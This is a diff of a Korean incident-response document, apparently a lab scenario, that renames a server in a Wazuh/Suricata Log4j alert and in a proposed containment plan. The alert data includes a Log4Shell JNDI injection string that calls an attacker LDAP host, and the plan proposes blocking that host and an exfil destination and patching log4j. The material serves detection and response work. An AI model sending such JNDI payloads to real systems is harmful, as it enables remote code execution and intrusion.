@@ -49,7 +49,7 @@ Wazuh는 14:15:05에 Suricata Log4j JNDI 시그니처를 level 12 Alert로 생�
   "rule": { "id": 86600, "level": 12,
             "description": "Suricata: ET EXPLOIT Apache log4j RCE Attempt (JNDI LDAP)",
             "mitre": { "id": ["T1190"], "tactic": ["Initial Access"] } },
-  "agent": { "id": "003", "name": "groot-c", "ip": "172.16.20.10" },
+  "agent": { "id": "003", "name": "groot-web", "ip": "172.16.20.10" },
   "data": { "src_ip": "192.168.10.20", "dest_ip": "172.16.20.10",
             "payload": "User-Agent: ${jndi:ldap://192.168.10.20:1389/x}" }
 }
@@ -138,7 +138,7 @@ network_search_suricata(src_ip="172.16.20.10", since="10m")
   "proposed_actions": [
     { "action": "block_ip", "target": "192.168.10.20", "reason": "attack source / LDAP callback" },
     { "action": "block_ip", "target": "203.0.113.77", "reason": "exfil destination" },
-    { "action": "quarantine_server", "target": "groot-c (172.16.20.10)", "reason": "root compromise + active exfil" }
+    { "action": "quarantine_server", "target": "groot-web (172.16.20.10)", "reason": "root compromise + active exfil" }
   ],
   "remediation": [
     "log4j 2.17.1+ 업그레이드 또는 log4j2.formatMsgNoLookups=true",
